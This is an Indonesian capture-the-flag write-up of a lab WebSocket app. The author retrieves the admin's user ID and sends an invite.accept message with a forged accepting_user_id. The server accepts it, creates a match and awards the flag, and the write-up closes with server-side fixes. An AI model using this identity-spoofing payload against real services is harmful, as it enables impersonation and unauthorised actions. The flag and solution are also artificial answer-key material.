# Writeup — WebSocket Invite Authorization Bypass

## Informasi Challenge

Challenge ini merupakan aplikasi web yang menyediakan fitur login, profile, invite, dan match melalui WebSocket.

Tujuan akhirnya adalah mendapatkan flag dengan membuat match antara user biasa dan `admin`.

Flag yang didapat:

```text
Thryve{9b0ddf74-95a2-4b61-bcb2-bc8fc912d96c}
```

## Recon

Pertama, login menggunakan akun user biasa:

```python
r = s.post(
    U + "/api/login",
    json={
        "username": "player_01",
        "password": "anything"
    }
)
```

Server memberikan response:

```json
{
  "message": "Login successful.",
  "ok": true,
  "session": {
    "authenticated": true,
    "display_name": "Player 01",
    "username": "player_01"
  }
}
```

Menariknya, password yang digunakan adalah `anything`, tetapi login tetap berhasil. Untuk challenge ini, yang penting adalah mendapatkan session cookie sebagai `player_01`.

## Enumerasi Admin Profile

Endpoint `/api/profile` dapat dipanggil dengan username yang diinginkan:

```python
r = s.post(
    U + "/api/profile",
    json={"username": "admin"}
)
```

Response memberikan informasi profile admin, termasuk user ID:

```json
{
  "ok": true,
  "profile": {
    "display_name": "Admin",
    "id": "usr_720d3cacc490036c2689c54bb194eede7b395ed4a7940bde",
    "username": "admin",
    "rating": 2870,
    "wins": 214,
    "losses": 6
  }
}
```

Dari sini kita mendapatkan:

```text
admin_id =
usr_720d3cacc490036c2689c54bb194eede7b395ed4a7940bde
```

## Analisis WebSocket

Setelah login, session cookie digunakan untuk melakukan koneksi ke:

```text
/ws
```

Connection dilakukan sebagai user `player_01`, sehingga server mengenali session WebSocket sebagai user biasa.

```python
ws = websocket.create_connection(
    WS + "/ws",
    header=[f"Cookie: {cookie_header}"]
)
```

Server kemudian mengirim:

```json
{
  "type": "session.ready",
  "ok": true,
  "user": {
    "username": "player_01",
    "display_name": "Player 01",
    "title": "Member",
    "rating": 1000
  }
}
```

Artinya koneksi WebSocket memang berjalan menggunakan identity `player_01`.

## Membuat Invite ke Admin

Langkah berikutnya adalah mengirim invite kepada admin:

```python
payload = {
    "type": "invite.send",
    "request_id": "req_send_admin",
    "to_user_id": admin_id
}

ws.send(json.dumps(payload))
```

Server menerima request tersebut dan membuat invite:

```json
{
  "type": "invite.created",
  "ok": true,
  "invite": {
    "invite_id": "inv_ff326362f5139f61d7e628b4820a16c4ae88b2256361209b",
    "from_user_id": "usr_edbb795c13e3cedc5b11c8815b2bc500f735c18d76066693",
    "to_user_id": "usr_720d3cacc490036c2689c54bb194eede7b395ed4a7940bde",
    "from_username": "player_01",
    "to_username": "admin",
    "status": "pending"
  }
}
```

Kita kemudian mendapatkan:

```text
invite_id =
inv_ff326362f5139f61d7e628b4820a16c4ae88b2256361209b
```

## Root Cause

Bug terdapat pada validasi endpoint WebSocket `invite.accept`.

Secara logika, hanya user yang menjadi penerima invite yang seharusnya dapat melakukan accept.

Namun, server menerima parameter:

```json
"accepting_user_id": "usr_720d3cacc490036c2689c54bb194eede7b395ed4a7940bde"
```

dan mempercayainya sebagai identity user yang melakukan accept.

Tidak terlihat adanya validasi yang memastikan:

```text
accepting_user_id == authenticated WebSocket user
```

Akibatnya, meskipun session WebSocket kita adalah `player_01`, kita dapat mengirimkan `accepting_user_id` milik `admin`.

Ini merupakan **Broken Access Control / IDOR-style authorization bypass** pada layer WebSocket.

## Eksploitasi

Setelah mendapatkan `invite_id`, kita mengirim:

```python
accept_payload = {
    "type": "invite.accept",
    "request_id": "req_accept_as_admin",
    "invite_id": invite_id,
    "accepting_user_id": admin_id
}

ws.send(json.dumps(accept_payload))
```

Perhatikan bahwa koneksi masih menggunakan session:

```text
player_01
```

tetapi field:

```text
accepting_user_id
```

dipalsukan menjadi:

```text
admin
```

Server tetap menerima request tersebut.

Response:

```json
{
  "type": "match.created",
  "ok": true,
  "match": {
    "match_id": "match_0396899fd973ead65f8a7c5009fd06234a908779b1702967",
    "invite_id": "inv_ff326362f5139f61d7e628b4820a16c4ae88b2256361209b",
    "white_user_id": "usr_edbb795c13e3cedc5b11c8815b2bc500f735c18d76066693",
    "black_user_id": "usr_720d3cacc490036c2689c54bb194eede7b395ed4a7940bde",
    "white_username": "player_01",
    "black_username": "admin",
    "status": "created"
  }
}
```

Match berhasil dibuat antara:

```text
White : player_01
Black : admin
```

Kemudian server mengirim event:

```json
{
  "type": "flag.awarded",
  "ok": true,
  "flag": "Thryve{9b0ddf74-95a2-4b61-bcb2-bc8fc912d96c}",
  "message": "Match confirmed."
}
```

## Exploit Flow

Secara keseluruhan attack flow adalah:

```text
Login sebagai player_01
        │
        ▼
Ambil profile admin
        │
        ▼
Dapatkan admin_id
        │
        ▼
Connect WebSocket sebagai player_01
        │
        ▼
invite.send → admin
        │
        ▼
Dapatkan invite_id
        │
        ▼
invite.accept
accepting_user_id = admin_id
        │
        ▼
Authorization bypass
        │
        ▼
Match player_01 vs admin
        │
        ▼
flag.awarded
        │
        ▼
Thryve{9b0ddf74-95a2-4b61-bcb2-bc8fc912d96c}
```

## Kesimpulan

Kerentanan utama challenge ini adalah **improper authorization pada WebSocket message**.

Server menggunakan nilai `accepting_user_id` yang dikirim client tanpa memastikan bahwa ID tersebut sesuai dengan user yang telah terautentikasi pada session WebSocket.

Seharusnya server mengambil identity langsung dari session:

```python
authenticated_user_id = websocket_session.user_id
```

dan tidak mempercayai identity yang dikirim client:

```python
accepting_user_id = message["accepting_user_id"]
```

Validasi yang benar kira-kira:

```python
if message["accepting_user_id"] != websocket_session.user_id:
    reject()
```

atau lebih baik lagi, field `accepting_user_id` tidak perlu diterima dari client sama sekali. Server harus menentukan user yang melakukan action berdasarkan session yang sudah terautentikasi.

## Flag

```text
Thryve{9b0ddf74-95a2-4b61-bcb2-bc8fc912d96c}
```

